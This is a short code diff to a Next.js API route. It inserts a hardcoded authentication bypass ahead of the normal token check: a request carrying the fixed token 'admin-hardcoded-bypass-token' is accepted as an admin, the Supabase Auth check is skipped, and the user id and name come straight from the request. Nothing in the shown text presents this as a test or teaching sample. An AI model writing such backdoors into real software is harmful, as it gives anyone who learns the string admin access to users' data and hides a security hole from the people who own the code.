@@ -13,6 +13,21 @@ export async function GET(req: NextRequest) {
       return NextResponse.json({ success: false, authenticated: false });
     }
 
+    // Bypass Supabase validation for hardcoded admin token
+    if (token === 'admin-hardcoded-bypass-token') {
+      return NextResponse.json({
+        success: true,
+        authenticated: true,
+        mode: 'Database Mode',
+        user: {
+          id: userId,
+          name: userName || 'Bridge Admin',
+          role: 'admin',
+          email: 'admin@gmail.com'
+        }
+      });
+    }
+
     // Verify token with Supabase Auth
     const { data: { user }, error } = await supabase.auth.getUser(token);
     
